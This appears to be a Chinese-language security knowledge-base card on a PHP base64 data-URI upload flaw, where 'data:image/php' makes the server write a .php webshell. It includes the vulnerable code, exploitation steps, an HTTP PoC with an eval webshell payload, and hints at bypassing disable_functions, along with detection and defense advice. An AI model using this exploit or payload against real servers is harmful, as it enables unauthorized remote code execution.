---
id: web-generic-file-upload-base64-data-uri-subtype-php-webshell
title: uploadbase64.php 的 data URI 上传：image/php 子类型被直接拼成 .php 后缀写入 Web 目录
type: scenario
domain: web
path: web/generic/file-upload
technique: base64-data-uri-mime-subtype-extension-upload
tags:
- php
- file-upload
- base64
- data-uri
- mime-type
- webshell
- unauthenticated
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V307
  verified_at: '2026-11-08T12:01:38+08:00'
  notes: 已对照原文源码与图10-13核对：uploadbase64.php 正则 /^(data:\s*image\/(\w+);base64,)/ 取 [2] 拼 .php、upload/ 相对路径、file_put_contents 无校验；图10/11 正常 png 上传回显 upload/2024-05-31-66593d88decb3.png、图12 image/php 上传回显 upload/2024-06-03-665d2423479ad.php、图13 蚁剑连接成功，均一致。已修正卡内步骤3 的 cmd 传参方式（原文载荷为 eval($_POST[cmd])，应 POST cmd=id）。dedup 与 JSP 版 data URI 卡 related（cosine 0.9125，语言/接口/鉴权/PoC 不同），dup-scan 三对均为 related，保留；CTF 靶场应用无版本。
url: /docs/web/generic/file-upload/web-generic-file-upload-base64-data-uri-subtype-php-webshell/
draft: false
kb_aliases:
- imgbase64 任意文件上传
- data:image/php
- base64 data URI 上传绕过
- MIME 子类型当扩展名
- uploadbase64.php
- base64 图片上传写 webshell
---

## 一句话结论

上传接口 `/uploadbase64.php` 用正则 `^(data:\s*image\/(\w+);base64,)` 从 `imgbase64` 参数里取 MIME 子类型，并把捕获到的 `(\w+)` 直接拼成文件扩展名；客户端把子类型写成 `php`（即 `data:image/php;base64,...`）时，服务端就生成 `upload/<日期>-<uniqid>.php` 并写入 base64 解码后的内容，未再做后缀白名单、内容/魔术字节校验或鉴权，匿名 POST 即可在 Web 目录落 PHP WebShell。

## 原理

- **入口与处理逻辑**（原文代码）：
  ```php
  $img = $_POST['imgbase64'];
  if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $img, $result)) {
      $type = ".".$result[2];
      $path = "upload/" . date("Y-m-d") . "-" . uniqid() . $type;
  }
  $img = base64_decode(str_replace($result[1], '', $img));
  @file_put_contents($path, $img);
  exit('{"src":"'.$path.'"}');
  ```
- **为什么能拿到 .php 后缀**：正则只要求前缀形如 `data:image/<若干个 \w 字符>;base64,`，`<子类型>` 完全由请求体控制；`php` 满足 `\w+`，于是 `$result[2] = "php"`、`$type = ".php"`。代码把“声称的图片 MIME”当作可信后缀，没有检查它是否属于 png/jpeg/gif 之类白名单，也没有检查解码后的内容是否真是图片。
- **为什么能落盘执行**：路径固定为相对路径 `upload/...`，即当前脚本所在目录下的 `upload/`（位于 Web 根内）；Apache/PHP 按 `.php` 后缀把文件交给 PHP 解析，`file_put_contents` 写入的内容就是可执行的 PHP 代码。
- **为什么可匿名利用**：该接口没有登录/权限校验，`imgbase64` 是普通 POST 参数；处理成功后在 JSON 里回显 `src` 路径，攻击者无需猜文件名。
- **文件名不可控但无碍**：服务端用 `date("Y-m-d")."-".uniqid()` 生成文件名，攻击者无法直接指定文件名，但响应会告知路径，且后缀由子类型决定，足以直接访问。
- **与“图片上传”本意的偏差**：接口想接收 base64 编码的图片，却把 data URI 的 MIME 子类型直接映射为扩展名——这是“信任客户端声明的类型”的典型错误。

## 触发条件

- 目标为 PHP 应用，存在 `uploadbase64.php`（或同逻辑的 base64 图片上传接口），可从网络访问。
- 接口无需登录/权限校验，或攻击者已有可用会话。
- `upload/` 目录位于 Web 根内且可写，Web 服务器按 `.php` 后缀解析（Apache + mod_php / PHP-FPM 常见配置）。
- `file_put_contents`、`base64_decode` 等函数未被禁用；若命令执行类函数被 `disable_functions` 禁用，WebShell 仍可落地，但执行系统命令需另做绕过（见关联卡）。

## 利用步骤

1. 访问 `/uploadbase64.php`，用一张正常图片的 data URI 测试接口是否工作（返回 `{"src":"upload/..."}` 即成功）。
2. 构造 `data:image/php;base64,<base64(PHP代码)>`，POST 到 `imgbase64` 参数；服务端生成 `.php` 文件并回显路径。
3. 用回显路径访问 WebShell，按载荷类型传入命令参数验证执行（原文载荷为 `eval($_POST[cmd])`，需 `POST cmd=id`；若换成 GET 型载荷才用 `?cmd=id`）。
4. 若返回 `ret=127`/无命令输出，说明 `disable_functions` 拦截了命令函数，先写 `phpinfo()` 查看禁用列表，再做 LD_PRELOAD/PHP7 UAF 等绕过。

## PoC

原文上传一句话木马（base64 内容解码为 `<?php eval($_POST[cmd]);?>`）：

```http
POST /uploadbase64.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

imgbase64=data%3aimage/php%3bbase64,PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4K
```

响应：

```json
{"src":"upload/2024-06-03-665d2423479ad.php"}
```

随后访问 `http://target/upload/2024-06-03-665d2423479ad.php`，`POST cmd=id` 即可执行。

## 变体与关联

- 子类型可换成目标环境会解析的其它后缀：`phtml`、`php5`、`php7` 等（取决于 Apache/PHP 配置）；`\w+` 不含 `+`、`.`，所以 `svg+xml` 之类不会被匹配。
- 若服务端按内容/魔术字节校验图片，可改用“图片马”或在允许的图片格式中嵌入 PHP 代码，再配合解析漏洞/文件包含。
- 上传落地后若遇 `disable_functions`，可接 LD_PRELOAD 绕过（见关联卡“蚁剑 LD_PRELOAD 插件绕过 disable_functions”）或 PHP7 Backtrace UAF。
- 同类模式在其它“base64 图片上传”接口中普遍存在：校验 data URI 前缀但不限制 MIME 子类型，或只检查扩展名黑名单。

## 检测与防御

- 服务端不要用客户端声明的 MIME 决定扩展名：按真实图片类型（`finfo`/`getimagesize` 魔术字节）判定，并用固定白名单映射扩展名（png→.png、jpeg→.jpg 等）。
- 上传文件名由服务端随机生成且强制安全后缀；上传目录放在 Web 根之外，或禁止该目录执行 PHP（Apache `php_admin_flag engine off`、Nginx 不把 upload 路径交给 PHP-FPM）。
- 增加鉴权与 CSRF 校验；限制上传大小与频率。
- 检测：审计 `imgbase64` 中出现 `data:image/php`、`data:image/phtml` 等非图片子类型的请求；监控 upload 目录新增的 `.php` 文件及其访问日志。
